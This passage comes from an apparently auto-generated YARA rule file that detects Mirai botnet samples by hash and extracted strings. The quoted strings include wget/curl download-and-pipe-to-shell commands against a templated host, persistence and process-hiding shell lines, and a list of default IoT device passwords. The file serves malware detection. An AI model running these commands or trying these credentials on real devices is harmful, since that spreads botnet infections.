      $s9 = "    for tool in 'curl -fsSL --max-time 30' 'wget -q --timeout=30 -O-' 'busybox wget -q -T 30 -O-' '/bin/busybox wget -q -T 30 -O" ascii /* score: '15.00'*/
      $s10 = "ps | grep uraskid | grep -v grep > /dev/null 2>&1 || %s skidstart &" fullword ascii /* score: '15.00'*/
      $s11 = "systemctl enable %s.service 2>/dev/null" fullword ascii /* score: '13.00'*/
      $s12 = "        TEMP_SCRIPT=\"/tmp/.s$$\"" fullword ascii /* score: '12.00'*/
      $s13 = "          chmod +x \"$TEMP_SCRIPT\" && sh \"$TEMP_SCRIPT\" >/dev/null 2>&1 &" fullword ascii /* score: '12.00'*/
      $s14 = "#!/bin/sh /etc/rc.common" fullword ascii /* score: '12.00'*/
      $s15 = "        chmod +x \"$TEMP_SCRIPT\" && sh \"$TEMP_SCRIPT\" >/dev/null 2>&1 &" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 900KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__7ed37f25_Mirai_signature__8765389e_Mirai_signature__8d05357c_Mirai_signature__8e895adc_Mirai_signature__96_15 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_7ed37f25.elf, Mirai(signature)_8765389e.elf, Mirai(signature)_8d05357c.elf, Mirai(signature)_8e895adc.elf, Mirai(signature)_9626c2cd.elf, Mirai(signature)_9d678687.elf, Mirai(signature)_a060b49c.elf, Mirai(signature)_a49c0bbe.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7ed37f25afae39680c46ec7059d465dfe42d4575729aea85736768062750694b"
      hash2 = "8765389e5e03b5780b01160276d83b19ae610eaf5dc834b0a853131d084ef894"
      hash3 = "8d05357cedcd5d0c92e1d0268e43e22b47ac755185458f7556e266041c6cc2e4"
      hash4 = "8e895adc6e77daafd4791dcc816487cbfa42688b2fbd1b66a99c37b5da14c2ea"
      hash5 = "9626c2cd56c5ee20d77ea2aaa5de959f75783bebe579088d2fc4f4d61c34b50f"
      hash6 = "9d6786871dc94431af660bba8fd943feeca68e3f5bcabe6cb6b52c68b91eaec2"
      hash7 = "a060b49c7c50f1133d3ad2218c7ff266e7b637e64bdc68a4d2cfc460f0075d9b"
      hash8 = "a49c0bbe50874e64bfb1bf6a17e609e9e9ae12535b279ebd9927bebc728905b1"
   strings:
      $s1 = "hexdump" fullword ascii /* score: '18.00'*/
      $s2 = "tcpdump" fullword ascii /* score: '18.00'*/
      $s3 = "/etc/systemd/system/reboot.target" fullword ascii /* score: '17.00'*/
      $s4 = "/usr/lib/systemd/system/reboot.target" fullword ascii /* score: '17.00'*/
      $s5 = "  4) echo 'Fatal error: User is a script kiddie';;" fullword ascii /* score: '16.00'*/
      $s6 = "for c in ps kill grep ls cat readlink mount umount awk sed cut wget curl top netstat ss lsof reboot shutdown halt poweroff; do m" ascii /* score: '15.00'*/
      $s7 = "for p in $(ps aux | grep '[%c]%s' | awk '{print $2}'); do   if [ $(stat -c %%X /proc/$p/stat 2>/dev/null || echo 0) -lt $(( $(da" ascii /* score: '14.00'*/
      $s8 = "  0) echo 'Command not found: Your skill level';;" fullword ascii /* score: '12.00'*/
      $s9 = "kfifo /tmp/$c 2>/dev/null; mount --bind /tmp/$c /bin/$c 2>/dev/null; mount --bind /tmp/$c /usr/bin/$c 2>/dev/null; mount --bind " ascii /* score: '11.00'*/
      $s10 = "/tmp/$c /sbin/$c 2>/dev/null; mount --bind /tmp/$c /usr/sbin/$c 2>/dev/null; done" fullword ascii /* score: '11.00'*/
      $s11 = "te +%%s) - 30 )) ]; then     kill -9 $p 2>/dev/null;   fi; done" fullword ascii /* score: '10.00'*/
      $s12 = "ftpput" fullword ascii /* score: '10.00'*/
      $s13 = "/system/bin/shutdown" fullword ascii /* score: '10.00'*/
      $s14 = "/sbin/service" fullword ascii /* score: '10.00'*/
      $s15 = "for p in $(ps aux | grep '[%c]%s' | awk '{print $2}'); do   if [ $(stat -c %%X /proc/$p/stat 2>/dev/null || echo 0) -lt $(( $(da" ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__85088762_Mirai_signature__8dfe2343_Mirai_signature__9e81bdfc_16 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_85088762.elf, Mirai(signature)_8dfe2343.elf, Mirai(signature)_9e81bdfc.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "85088762d55a62537b044526545f72265778d85504cbab15d830881edf068bb9"
      hash2 = "8dfe2343b164f4c101945d1432d7bc022807fdd7de52b39d915746e9da31d319"
      hash3 = "9e81bdfc03e6f75e7e4c892851968608e32fbe7735bfc46830ec0892783b2072"
   strings:
      $s1 = "/usr/libexec/elogind" fullword ascii /* score: '20.00'*/
      $s2 = "/tmp/.systemhost" fullword ascii /* score: '19.00'*/
      $s3 = "/usr/sbin/login" fullword ascii /* score: '18.00'*/
      $s4 = "/sbin/sulogin" fullword ascii /* score: '18.00'*/
      $s5 = "/lib/systemd/systemd-logind" fullword ascii /* score: '15.00'*/
      $s6 = "/sbin/syslogd" fullword ascii /* score: '12.00'*/
      $s7 = "/usr/sbin/tftpd" fullword ascii /* score: '12.00'*/
      $s8 = "/usr/libexec/ksmtuned" fullword ascii /* score: '12.00'*/
      $s9 = "/usr/sbin/postfix" fullword ascii /* score: '12.00'*/
      $s10 = "/sbin/getty" fullword ascii /* score: '12.00'*/
      $s11 = "/usr/sbin/mingetty" fullword ascii /* score: '12.00'*/
      $s12 = "/usr/sbin/ftpd" fullword ascii /* score: '12.00'*/
      $s13 = "/sbin/klogd" fullword ascii /* score: '12.00'*/
      $s14 = "/usr/sbin/hostnamed" fullword ascii /* score: '12.00'*/
      $s15 = "/usr/sbin/vsftpd" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__6d36c21a_Mirai_signature__98ddba6e_Mirai_signature__9c64403e_Mirai_signature__af915026_17 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_6d36c21a.elf, Mirai(signature)_98ddba6e.elf, Mirai(signature)_9c64403e.elf, Mirai(signature)_af915026.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6d36c21a863c7722d3d947ab9f0ac9abbe3dc9f12f031e0879a55c86d147d4f7"
      hash2 = "98ddba6e47f4d3e446df9412bb9cc9a9cb10ab115e8e33f096968029125cc727"
      hash3 = "9c64403e061cc02d28e1883aba061f9c580c61d11a8d9f91530f12bab686061c"
      hash4 = "af91502655331308b7b116b0bb264f08c62e7bd6a8799651d0771e32049207bc"
   strings:
      $s1 = "Origin: https://www.yahoo.com" fullword ascii /* score: '21.00'*/
      $s2 = "Origin: https://www.youtube.com" fullword ascii /* score: '21.00'*/
      $s3 = "Origin: https://www.bing.com" fullword ascii /* score: '21.00'*/
      $s4 = "Origin: https://www.reddit.com" fullword ascii /* score: '21.00'*/
      $s5 = "Origin: https://www.netflix.com" fullword ascii /* score: '21.00'*/
      $s6 = "Referer: https://www.reddit.com/" fullword ascii /* score: '17.00'*/
      $s7 = "Referer: https://www.bing.com/" fullword ascii /* score: '17.00'*/
      $s8 = "Referer: https://www.netflix.com/" fullword ascii /* score: '17.00'*/
      $s9 = "Referer: https://www.google.com/" fullword ascii /* score: '17.00'*/
      $s10 = "Referer: https://www.youtube.com/" fullword ascii /* score: '17.00'*/
      $s11 = "Referer: https://www.yahoo.com/" fullword ascii /* score: '17.00'*/
      $s12 = "X-Forwarded-For: 192.168.1.1" fullword ascii /* score: '14.00'*/
      $s13 = "X-Forwarded-For: 203.0.113.1" fullword ascii /* score: '14.00'*/
      $s14 = "X-Forwarded-For: 10.0.0.1" fullword ascii /* score: '14.00'*/
      $s15 = "X-Forwarded-For: 172.16.0.1" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__6d144ff0_Mirai_signature__6ff21f19_Mirai_signature__70ae2421_Mirai_signature__70e11049_Mirai_signature__70_18 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_6d144ff0.elf, Mirai(signature)_6ff21f19.elf, Mirai(signature)_70ae2421.elf, Mirai(signature)_70e11049.elf, Mirai(signature)_70f473c7.elf, Mirai(signature)_7cd90cfd.elf, Mirai(signature)_7e528454.elf, Mirai(signature)_844ac003.elf, Mirai(signature)_848869fb.elf, Mirai(signature)_85522c0c.elf, Mirai(signature)_869f50c7.elf, Mirai(signature)_89fa8230.elf, Mirai(signature)_919d2b3d.elf, Mirai(signature)_9538fec5.elf, Mirai(signature)_994c14d7.elf, Mirai(signature)_9eada9e7.elf, Mirai(signature)_a3bf5ed2.elf, Mirai(signature)_a99c4815.elf, Mirai(signature)_aa2a31bc.elf, Mirai(signature)_aa73dbf2.elf, Mirai(signature)_ab270778.elf, Mirai(signature)_ae93d820.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6d144ff0ea4ee4c4b69c74316a9e0316db85efb4b24eee079238ca699c8d22b4"
      hash2 = "6ff21f19a4a1562c280c1fb54b59c5e3463615a6f3351474fb7d1e7c4efc9b56"
      hash3 = "70ae2421c44888060b21a1bd3d083c12394a34f76f27b89a15a84684162aa2e5"
      hash4 = "70e110499d9b759dd240fad8e9a79bf21cb61801ef7f9bd7de9e4fe2b840ab4d"
      hash5 = "70f473c758172b4c8daebde3ec69f553dd250bfe49b65e15d8acfcc2383ba202"
      hash6 = "7cd90cfd49f396a76d90a287400e3b0190535bc50457419c9b8689409a99954f"
      hash7 = "7e528454073e710cadec7898d48732ef5ea60abe6951b5c4c4da7478f43f7483"
      hash8 = "844ac003aa6961360aa376bb5cc0deee0e48fcf688bdc8ece09a86cea4cb7f01"
      hash9 = "848869fbc73a981e67d9d828fbd59729bc07b88bd8d4677d8c8988aa2a5c07da"
      hash10 = "85522c0c606792d409f3dd9faf8f89d72378c6b31e6d04bd5e4ad7d9c96fccd6"
      hash11 = "869f50c722c0eda6579569094f25ecae49e8ff5235fda937e4f147a1222dbebe"
      hash12 = "89fa82309afe76391b58e5d7a611e41d9743304f9d552fd10510cf062463928c"
      hash13 = "919d2b3dd85c5d1e9191cd3c972135a7a570bcc8c54193f74062aec265adf843"
      hash14 = "9538fec56c2f7397772a1d3bd3a909165b295ee2acbe4a8349735d270fb6926f"
      hash15 = "994c14d7ab6080f0eb3ba996371ce1438bba81cceaf120852832f29fb5df0340"
      hash16 = "9eada9e76633b0ee6b5e79d12976e46f8c5b6e5a91e15e3ef0143a5958cbeb0c"
      hash17 = "a3bf5ed2eb9c21403a3894b0f182ea6d21eb571dcaa566fbf9d02473303edc4c"
      hash18 = "a99c4815b1e9e3e80c5153d00e7d6cf56994b81cfec6570a018472b89b82bac1"
      hash19 = "aa2a31bc57e8e83fcf8c757acd5eeb2aacb0a528486c314c0574e5e93d8962e4"
      hash20 = "aa73dbf28fe4883fdf873a3a0ffb19796bf7ac1da5e1e59a4fda535ed9247ae3"
      hash21 = "ab270778dd3275544a794b0961f2880965f340a3a2c1b51b1c2f343163e7c59c"
      hash22 = "ae93d820fb2fd9ec80de19f11ef6254b741d96de849f449ef664334e410eb8a6"
   strings:
      $s1 = "processCmd" fullword ascii /* score: '18.00'*/
      $s2 = "UserAgents" fullword ascii /* score: '12.00'*/
      $s3 = "httphex" fullword ascii /* score: '11.00'*/
      $s4 = "fdgets" fullword ascii /* score: '10.00'*/
      $s5 = "getOurIP" fullword ascii /* score: '9.00'*/
      $s6 = "resolv_domain_to_hostname" fullword ascii /* score: '9.00'*/
      $s7 = "sockprintf" fullword ascii /* score: '8.00'*/
      $s8 = "makevsepacket" fullword ascii /* score: '8.00'*/
      $s9 = "vseattack" fullword ascii /* score: '8.00'*/
      $s10 = "printchar" fullword ascii /* score: '8.00'*/
      $s11 = "fdpopen" fullword ascii /* score: '8.00'*/
      $s12 = "szprintf" fullword ascii /* score: '8.00'*/
      $s13 = "tcpcsum" fullword ascii /* score: '8.00'*/
      $s14 = "hextable" fullword ascii /* score: '8.00'*/
      $s15 = "fdpclose" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__6db3a177_Mirai_signature__6e668bb5_Mirai_signature__6f10b560_Mirai_signature__714d5510_Mirai_signature__71_19 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_6db3a177.elf, Mirai(signature)_6e668bb5.elf, Mirai(signature)_6f10b560.elf, Mirai(signature)_714d5510.elf, Mirai(signature)_719f1ad5.elf, Mirai(signature)_7634dc49.elf, Mirai(signature)_7bd91377.elf, Mirai(signature)_7cd5fb5b.elf, Mirai(signature)_7cee4ac4.elf, Mirai(signature)_7d4692b4.elf, Mirai(signature)_7e7ed21f.elf, Mirai(signature)_7ed37f25.elf, Mirai(signature)_7f12c8ad.elf, Mirai(signature)_7f7f0d71.elf, Mirai(signature)_803fc41d.elf, Mirai(signature)_811aedc1.elf, Mirai(signature)_827c160f.elf, Mirai(signature)_8571d041.elf, Mirai(signature)_8765389e.elf, Mirai(signature)_878231e8.elf, Mirai(signature)_87c7e371.elf, Mirai(signature)_89d19388.elf, Mirai(signature)_8a235a93.elf, Mirai(signature)_8c714bda.elf, Mirai(signature)_8c8a8f58.elf, Mirai(signature)_8ccd2692.elf, Mirai(signature)_8ce7f2db.elf, Mirai(signature)_8d05357c.elf, Mirai(signature)_8d37351f.elf, Mirai(signature)_8d786cca.elf, Mirai(signature)_8db72cf3.elf, Mirai(signature)_8e515c52.elf, Mirai(signature)_8e895adc.elf, Mirai(signature)_8ed30a24.elf, Mirai(signature)_91a75187.elf, Mirai(signature)_95aaa966.elf, Mirai(signature)_9626c2cd.elf, Mirai(signature)_9676d340.elf, Mirai(signature)_97802b1d.elf, Mirai(signature)_99453578.elf, Mirai(signature)_99920319.elf, Mirai(signature)_9d678687.elf, Mirai(signature)_9db44728.elf, Mirai(signature)_a060b49c.elf, Mirai(signature)_a15024db.elf, Mirai(signature)_a1e3868c.elf, Mirai(signature)_a31264c5.elf, Mirai(signature)_a38e9528.elf, Mirai(signature)_a49c0bbe.elf, Mirai(signature)_a4a844a5.elf, Mirai(signature)_a64df1d1.elf, Mirai(signature)_a7ce2785.elf, Mirai(signature)_a84f6566.elf, Mirai(signature)_a94f0ac8.elf, Mirai(signature)_aa3734d3.elf, Mirai(signature)_ab2d4681.elf, Mirai(signature)_ac47df80.elf, Mirai(signature)_ac5d1b44.elf, Mirai(signature)_ad6b7a16.elf, Mirai(signature)_af7b0e08.elf, Mirai(signature)_b0aff673.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6db3a1777017535d3135eaa931e02a5512be5eec3571261740d71addc050a9e6"
      hash2 = "6e668bb59635e43604cacaf2067fb0c89ea7764f30867059429dbc92ae95d7bf"
      hash3 = "6f10b560368b57042dbdec1291aa971334a949e3fdddeffbf8af0d413f2f3ed4"
      hash4 = "714d5510deeefc8f0e36609b1713fe7acf20cdb661eee78bc69723f54f4d46f4"
      hash5 = "719f1ad5d390910e62956a2f1cdfea9a432c6041d6c5765f9713c091d0ce2e66"
      hash6 = "7634dc492f9f1418c4707b9b69908b8ee1671fe56d9587d96a38f1086b658fb1"
      hash7 = "7bd913776eaa318cdd4eac133b27578c9eec59bcda1e9b2a8f5cd60218683695"
      hash8 = "7cd5fb5b6d94ac2acf16f8904f6f307f47710df1d51129d55e70590a52dcf823"
      hash9 = "7cee4ac4c5c52fb2d0c2d6edd4dec611dfebace1eae0d58d56b2429ff5a66397"
      hash10 = "7d4692b402ff07def26843c56e6a43236e351f7d92a317223c7b466c8ecad60e"
      hash11 = "7e7ed21fc051b096ab0d5507e254c8855fa81533a30577ce72c71dbfe6ccc901"
      hash12 = "7ed37f25afae39680c46ec7059d465dfe42d4575729aea85736768062750694b"
      hash13 = "7f12c8ad451f4df4f9eaf2f533bfd3f77efd4427f08513d0f30833a7875f035a"
      hash14 = "7f7f0d711bbb3fd8c747e86a594c875ace72c37a48c3b1332e14a84f92bfd0ab"
      hash15 = "803fc41d02729507424e4fda1127ff7e559b2150c81aea4ec000e2189fbf16b6"
      hash16 = "811aedc19b2e07691302b450acfb043030e041ff0d56e17d25e2d7528645be11"
      hash17 = "827c160f408822ca75b51c498f257842f75ea9a12b6428420688744c302a0703"
      hash18 = "8571d0411fc287f3cdf03bfe953433b4fc187dba200a3c4164fac2bce0037e93"
      hash19 = "8765389e5e03b5780b01160276d83b19ae610eaf5dc834b0a853131d084ef894"
      hash20 = "878231e8edc53ba8bbc1f6f05a72fda2e9c3c00aa9722e859496bde9969f585b"
      hash21 = "87c7e371030b3647b3c8bfb52574d6d8932d179d0301edf6e8001faf19ecba1c"
      hash22 = "89d1938880ecbc4dff0fc204f23f3d11b96fdc2303bbb97a5e92a4da87b9acdc"
      hash23 = "8a235a9336092da5a5fd75dc7c04bf109a796cab8cbe52666f972c2c5f3ff285"
      hash24 = "8c714bdaa8914237ba7dc9eaa764184ae17ed4c5eeede566aaffecd1d47fe5bc"
      hash25 = "8c8a8f58193d087758ebf65c4c7e4e73b299f14818d6e70b6379a4182ea32a6a"
      hash26 = "8ccd2692fafd017a9c155374bb7fd17213b07059339477332be4a6284450171a"
      hash27 = "8ce7f2db15f0ab4d5317f085c7208b55cfebf5d9262bfb566b01a58cf892ac0a"
      hash28 = "8d05357cedcd5d0c92e1d0268e43e22b47ac755185458f7556e266041c6cc2e4"
      hash29 = "8d37351feb40c8cffa43b778bc7087eb6b516b5e498244e640ab366d276d4800"
      hash30 = "8d786ccae620d4e466b4acc6f00263008f96ccfcaee98f194806d08f7cdae41d"
      hash31 = "8db72cf3c17c8e2ce37789cc8c7f1403a8f8ae0d790cc9df566365e20268c2d0"
      hash32 = "8e515c524d7749bc86597c8b5b7759683fa8a614b8ab125c67ef2397bb057d6e"
      hash33 = "8e895adc6e77daafd4791dcc816487cbfa42688b2fbd1b66a99c37b5da14c2ea"
      hash34 = "8ed30a24addbae5a6c1bc5f4cc3bc3a0e977bae90199379f14a1a89915ef1754"
      hash35 = "91a75187b0ddb735e9e3920150fc7eca5115e1a59000442a366e3b938cd473d0"
      hash36 = "95aaa9662104a4d431c88ce9422df8c6c34ac73225ba716febae85b96470f455"
      hash37 = "9626c2cd56c5ee20d77ea2aaa5de959f75783bebe579088d2fc4f4d61c34b50f"
      hash38 = "9676d340c5229ce5c1a79621e346bce300e02f5736133bba695438daaad87a30"
      hash39 = "97802b1dea30453d690bc2907b6ca1f8f669075fb0c99991fb14a9d3afaf74a7"
      hash40 = "994535783bd4145aa1559f92c3663ccc4177bd079ffbd445673d7904d5b02475"
      hash41 = "999203197097afae9c40fb98be8c71c8692aa45df3cae7edb23a74f94149401a"
      hash42 = "9d6786871dc94431af660bba8fd943feeca68e3f5bcabe6cb6b52c68b91eaec2"
      hash43 = "9db4472896aa7f67644efc5cac5ad0022c0baa5e18e4adfb9ae9fb6d92ad8749"
      hash44 = "a060b49c7c50f1133d3ad2218c7ff266e7b637e64bdc68a4d2cfc460f0075d9b"
      hash45 = "a15024dbe8201dea7d95a48a51e71b299f0f3e79b68911e89cb0372fc7ef039f"
      hash46 = "a1e3868cd05e4af35711546d91d56527f21e448d9ee075a1b0e9c02a31188de8"
      hash47 = "a31264c50f0c10ecdc54a6bd3d05c8be5554479c2ff751b64e6794f7a5e99f17"
      hash48 = "a38e9528a953e181cca07181c37c0c8efcf63e0e8ae014a150a12f2a45231d0f"
      hash49 = "a49c0bbe50874e64bfb1bf6a17e609e9e9ae12535b279ebd9927bebc728905b1"
      hash50 = "a4a844a50d5fe49442dd85f6b0b7750f229ad8b7e35261e2b9f911d846d6892f"
      hash51 = "a64df1d17f7c1575c62efe35fa466d6217cddb6b813ea9fc7039b3a451326c93"
      hash52 = "a7ce2785a746d714cd6407d2a8ef07c9d510e10b46f0f8d0d4a266cc16774a57"
      hash53 = "a84f65668fc77f814ad920b60f5733c69ac7ff91bfa05836675d6019ea38bf82"
      hash54 = "a94f0ac8022435c978564fabdc1a6cf7e913fd999aa71923d1697d60d95ac22f"
      hash55 = "aa3734d3fc00b1ba582d9b2ba250db27334e5b094d1c40ee62234614afafce60"
      hash56 = "ab2d4681a3b0f00268a5f0c83e7a1b065b98fba7a8b3711900e28fae805f1d90"
      hash57 = "ac47df80a238e71e50a70d4b63755a33db18654650a145e56838276135d6c8a6"
      hash58 = "ac5d1b44b3ac7c62d5e5872279097c57d5d3cd3992c88773fb9d86f8013388bf"
      hash59 = "ad6b7a1640f575d8c0234516f5b5c68444df92e096ead00bc8501824951c7cb1"
      hash60 = "af7b0e08e8f0cbf59cc2884d7b1c6fe205c3aa9934ca71dae6213faba4dd64ab"
      hash61 = "b0aff673461d8e95841f9f8f5182f2482aab376a2a3d71e53dc65d8ad0c40c65"
   strings:
      $s1 = "User-Agent: Wget" fullword ascii /* score: '17.00'*/
      $s2 = "xirtam" fullword ascii /* reversed goodware string 'matrix' */ /* score: '15.00'*/
      $s3 = "supportadmin" fullword ascii /* score: '11.00'*/
      $s4 = "admintelecom" fullword ascii /* score: '11.00'*/
      $s5 = "/bin/busybox echo -ne " fullword ascii /* score: '11.00'*/
      $s6 = "solokey" fullword ascii /* score: '11.00'*/
      $s7 = "grouter" fullword ascii /* score: '8.00'*/
      $s8 = "root621" fullword ascii /* score: '8.00'*/
      $s9 = "tsgoingon" fullword ascii /* score: '8.00'*/
      $s10 = "hikvision" fullword ascii /* score: '8.00'*/
      $s11 = "root123" fullword ascii /* score: '8.00'*/
      $s12 = "unisheen" fullword ascii /* score: '8.00'*/
      $s13 = "zhongxing" fullword ascii /* score: '8.00'*/
      $s14 = "firetide" fullword ascii /* score: '8.00'*/
      $s15 = "wabjtam" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__6fa04384_Mirai_signature__7a14f5cb_Mirai_signature__9d328f65_Mirai_signature__a270e1c5_Mirai_signature__ac_20 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_6fa04384.elf, Mirai(signature)_7a14f5cb.elf, Mirai(signature)_9d328f65.elf, Mirai(signature)_a270e1c5.elf, Mirai(signature)_ac20f7ae.elf, Mirai(signature)_ae734719.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6fa043849b7eaf72769786c99d693c11ee82b885250fad3f7dd4ade24866267a"
      hash2 = "7a14f5cbf5f5cc545c10af6a2226e2d50421ccfd04fbd204ec3eeabf6b49e010"
      hash3 = "9d328f65c944f1043f487c4992a19f80d6142d36f0cf49396e024d159afa6723"
      hash4 = "a270e1c59417d8ec9a977213d3c4fb5dbd7f2507337d0bc703c2ee2e96aaafab"
      hash5 = "ac20f7ae6b033932d8d33392251f0aea2e7c495aadc11355e2d4c714fe7b14cb"
      hash6 = "ae7347197673650a50dd6d22ee236c01ccc81a35290d718a25e036b4e9503c90"
   strings:
      $s1 = "POST /login.htm HTTP/1.1" fullword ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat" ascii /* score: '29.00'*/
      $s3 = "command=login&username=%s&password=%s" fullword ascii /* score: '26.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat.sh; " fullword ascii /* score: '24.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root/ wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat.sh; " fullword ascii /* score: '24.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat" ascii /* score: '24.00'*/
      $s7 = "[0mPassword: " fullword ascii /* score: '16.00'*/
      $s8 = "Host: %s:554" fullword ascii /* score: '14.50'*/
      $s9 = "POST / HTTP/1.1" fullword ascii /* score: '12.00'*/
      $s10 = "HEAD / HTTP/1.1" fullword ascii /* score: '12.00'*/
      $s11 = "/usr/sbin/klogd" fullword ascii /* score: '12.00'*/
      $s12 = "!openshell %d %8s" fullword ascii /* score: '12.00'*/
      $s13 = "[0mWrong password!" fullword ascii /* score: '12.00'*/
      $s14 = "/usr/sbin/syslogd" fullword ascii /* score: '12.00'*/
      $s15 = "[0mNo shell available" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__6f10b560_Mirai_signature__714d5510_Mirai_signature__7634dc49_Mirai_signature__7cd5fb5b_Mirai_signature__7d_21 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_6f10b560.elf, Mirai(signature)_714d5510.elf, Mirai(signature)_7634dc49.elf, Mirai(signature)_7cd5fb5b.elf, Mirai(signature)_7d4692b4.elf, Mirai(signature)_811aedc1.elf, Mirai(signature)_87c7e371.elf, Mirai(signature)_89d19388.elf, Mirai(signature)_8a235a93.elf, Mirai(signature)_8c8a8f58.elf, Mirai(signature)_8ccd2692.elf, Mirai(signature)_8ce7f2db.elf, Mirai(signature)_8ed30a24.elf, Mirai(signature)_99453578.elf, Mirai(signature)_a1e3868c.elf, Mirai(signature)_a38e9528.elf, Mirai(signature)_a7ce2785.elf, Mirai(signature)_a94f0ac8.elf, Mirai(signature)_af7b0e08.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6f10b560368b57042dbdec1291aa971334a949e3fdddeffbf8af0d413f2f3ed4"
      hash2 = "714d5510deeefc8f0e36609b1713fe7acf20cdb661eee78bc69723f54f4d46f4"
      hash3 = "7634dc492f9f1418c4707b9b69908b8ee1671fe56d9587d96a38f1086b658fb1"
      hash4 = "7cd5fb5b6d94ac2acf16f8904f6f307f47710df1d51129d55e70590a52dcf823"
      hash5 = "7d4692b402ff07def26843c56e6a43236e351f7d92a317223c7b466c8ecad60e"
      hash6 = "811aedc19b2e07691302b450acfb043030e041ff0d56e17d25e2d7528645be11"
      hash7 = "87c7e371030b3647b3c8bfb52574d6d8932d179d0301edf6e8001faf19ecba1c"
      hash8 = "89d1938880ecbc4dff0fc204f23f3d11b96fdc2303bbb97a5e92a4da87b9acdc"
      hash9 = "8a235a9336092da5a5fd75dc7c04bf109a796cab8cbe52666f972c2c5f3ff285"
      hash10 = "8c8a8f58193d087758ebf65c4c7e4e73b299f14818d6e70b6379a4182ea32a6a"
      hash11 = "8ccd2692fafd017a9c155374bb7fd17213b07059339477332be4a6284450171a"
      hash12 = "8ce7f2db15f0ab4d5317f085c7208b55cfebf5d9262bfb566b01a58cf892ac0a"
      hash13 = "8ed30a24addbae5a6c1bc5f4cc3bc3a0e977bae90199379f14a1a89915ef1754"
      hash14 = "994535783bd4145aa1559f92c3663ccc4177bd079ffbd445673d7904d5b02475"
      hash15 = "a1e3868cd05e4af35711546d91d56527f21e448d9ee075a1b0e9c02a31188de8"
      hash16 = "a38e9528a953e181cca07181c37c0c8efcf63e0e8ae014a150a12f2a45231d0f"
      hash17 = "a7ce2785a746d714cd6407d2a8ef07c9d510e10b46f0f8d0d4a266cc16774a57"
      hash18 = "a94f0ac8022435c978564fabdc1a6cf7e913fd999aa71923d1697d60d95ac22f"
      hash19 = "af7b0e08e8f0cbf59cc2884d7b1c6fe205c3aa9934ca71dae6213faba4dd64ab"
   strings:
      $s1 = "/t/wget.sh -O- | sh;curl http://" fullword ascii /* score: '20.00'*/
      $s2 = "/bin/busybox wget http://" fullword ascii /* score: '15.00'*/
      $s3 = "/t/curl.sh -o- | sh" fullword ascii /* score: '12.00'*/
      $s4 = "/bin/busybox echo -ne \"\\x71\\x20\\x22\\x64\\x76\\x72\\x48\\x65\\x6C\\x70\\x65\\x72\\x22\\x3B\\x20\\x74\\x68\\x65\\x6E\\x0A\\x2" ascii /* score: '11.00'*/
      $s5 = "/bin/busybox echo -ne \"\\x69\\x6E\\x75\\x65\\x0A\\x20\\x20\\x66\\x69\\x0A\\x0A\\x20\\x20\\x23\\x20\\x47\\x65\\x74\\x20\\x74\\x6" ascii /* score: '11.00'*/
      $s6 = "/bin/busybox rm -rf .ntpf .k" fullword ascii /* score: '11.00'*/
      $s7 = "useradmin" fullword ascii /* score: '11.00'*/
      $s8 = "/bin/busybox echo -ne \"\\x20\\x2F\\x70\\x72\\x6F\\x63\\x2F\\x24\\x70\\x69\\x64\\x2F\\x63\\x6D\\x64\\x6C\\x69\\x6E\\x65\\x20\\x3" ascii /* score: '11.00'*/
      $s9 = "/bin/busybox echo -ne \"\\x71\\x20\\x22\\x64\\x76\\x72\\x48\\x65\\x6C\\x70\\x65\\x72\\x22\\x3B\\x20\\x74\\x68\\x65\\x6E\\x0A\\x2" ascii /* score: '11.00'*/
      $s10 = "/bin/busybox echo -ne \"\\x20\\x20\\x70\\x69\\x64\\x3D\\x24\\x7B\\x70\\x72\\x6F\\x63\\x5F\\x64\\x69\\x72\\x23\\x23\\x2A\\x2F\\x7" ascii /* score: '11.00'*/
      $s11 = "/bin/busybox echo -ne \"\\x20\\x74\\x68\\x65\\x20\\x70\\x72\\x6F\\x63\\x65\\x73\\x73\\x0A\\x20\\x20\\x63\\x6D\\x64\\x6C\\x69\\x6" ascii /* score: '11.00'*/
